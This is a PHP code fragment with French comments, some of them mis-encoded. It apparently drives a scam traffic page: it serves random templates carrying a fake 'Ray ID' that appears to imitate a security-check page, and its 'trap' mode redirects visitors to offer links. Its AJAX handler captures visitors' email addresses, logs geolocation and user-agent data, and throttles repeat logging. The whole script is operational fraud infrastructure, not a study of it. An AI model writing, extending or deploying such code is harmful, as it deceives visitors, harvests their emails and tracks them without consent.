// ============================================================
// 5. GESTION DES REQU√äTES (MODIFI√âE)
// ============================================================

// --- 5A. MODE CHARGEMENT DYNAMIQUE DU TEMPLATE (Requ√™te GET initiale) ---
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'get_template') {
    
    if (empty($html_templates)) {
        header('Content-Type: application/json; charset=UTF-8');
        echo json_encode(['status' => 'error', 'message' => 'Templates non d√©finis.']);
        exit;
    }
    
    $template_key = array_rand($html_templates);
    $chosen_template = $html_templates[$template_key];
    
    // 2. PR√âPARATION DU CONTENU (Remplacement des placeholders)
    $html_content = $chosen_template['template'];
    $html_js_script = $chosen_template['script'];
    $html_css_script = $chosen_template['css'] ?? ''; 

    $final_html = str_replace(
        ['%RAY_ID%', '%YEAR%', '%LOADER_HTML%'],
        [substr(md5(time()), 0, 16), date('Y'), LOADER_HTML],
        $html_content
    );
    
    // 3. ENVOI DU R√âSULTAT EN JSON
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode([
        'status' => 'ok',
        'html'   => $final_html,
        'css'    => $html_css_script,
        'js'     => $html_js_script
    ]);
    exit;
}


// --- 5B. MODE TRAP DE REDIRECTION (Requ√™te GET avec sec_id) ---
if (isset($_GET['sec_id']) && !empty($_GET['sec_id'])) {
    $trap_id = $_GET['sec_id'];
    $trap_url = $matrix_offres[$trap_id][0] ?? $matrix_offres['offrefr'][0]; // Fallback √† offrefr
    
    $url = prepareUrl($trap_url);
    header("Location: $url");
    exit;
}


// --- 5C. MODE AJAX (Requ√™te POST apr√®s clic du bouton) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'get_links') {
    
    // 1. Stocker l'email dans la session s'il est envoy√© via POST
    if (isset($_POST['u'])) {
        $_SESSION['saved_email'] = trim($_POST['u']); 
    }
    
    $extra_params = $_POST;
    unset($extra_params['action'], $extra_params['u']);
    $_SESSION['extra_params'] = $extra_params;
    
    // R√©cup√©rer l'email √† partir de la session pour la v√©rification
    $email_to_check = $_SESSION['saved_email'] ?? 'unknown';

    // üö® SOLUTION EXTR√äME DE BLOCAGE DE LA SECONDE EX√âCUTION üö®
    if ($email_to_check !== 'unknown' && isset($_SESSION['logged_emails_today'][$email_to_check])) {
        // Si l'e-mail est d√©j√† marqu√© comme logu√© aujourd'hui, on bloque la s√©lection et le log.
        // On renvoie juste le statut pour que le JS puisse continuer (ou √©chouer si les liens sont perdus)
        header('Content-Type: application/json; charset=UTF-8');
        echo json_encode(['status'=>'ok', 'message'=>'Log already performed today.']);
        exit;
    }
    // FIN DU BLOCAGE EXTR√äME
    
    // üö® APPEL DE LA NOUVELLE LOGIQUE DE S√âLECTION üö®
    $response = selectThreeRandomOffers();

    // Log la redirection principale pour l'historique GEO/UA
    performGeoLoggingAndReset($response['url_main'] ?? 'unknown'); 

    // Envoi des URLs au JavaScript (JSON)
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode($response);
    exit;
}

// --- Si la page est acc√©d√©e directement sans action GET/POST valide ---
header('Content-Type: text/html; charset=UTF-8');
http_response_code(403);
echo "<html><body><p style='color: red; text-align: center; margin-top: 100px;'>Acc√®s direct non autoris√© √† la page</p></body></html>";

?>
